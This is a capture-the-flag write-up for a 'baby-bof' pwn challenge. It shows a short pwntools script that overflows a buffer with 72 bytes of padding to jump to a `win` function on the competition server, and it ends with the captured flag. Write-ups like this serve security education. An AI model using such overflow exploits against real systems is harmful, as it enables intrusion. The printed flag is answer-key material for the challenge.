# _baby-bof_

Category | Value
-- | --
Pwn | 500

I instantly recognized this as a classic buffer overflow challenge and already had an exploit nearly ready. I verified the binary for symbols with `objdump`/`readelf` and found a `win` function.

Using a simple remote exploit, overflow the return address with a 72-byte padding and overwrite it with the `win` address, got me the flag.

### Exploit (cleaned)

```python
from pwn import *

p   = remote("ctf.ac.upt.ro", 9232)
elf = ELF("./challenge")
win = elf.symbols["win"]

payload  = b"A" * 72
payload += p64(win)

p.sendlineafter(b"Spune ceva:", payload)
p.interactive()
```

Works because the saved return address sits 72 bytes after the buffer; jumping to `win` triggers the desired behavior.

## Proof-of-flag
```
ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}
```
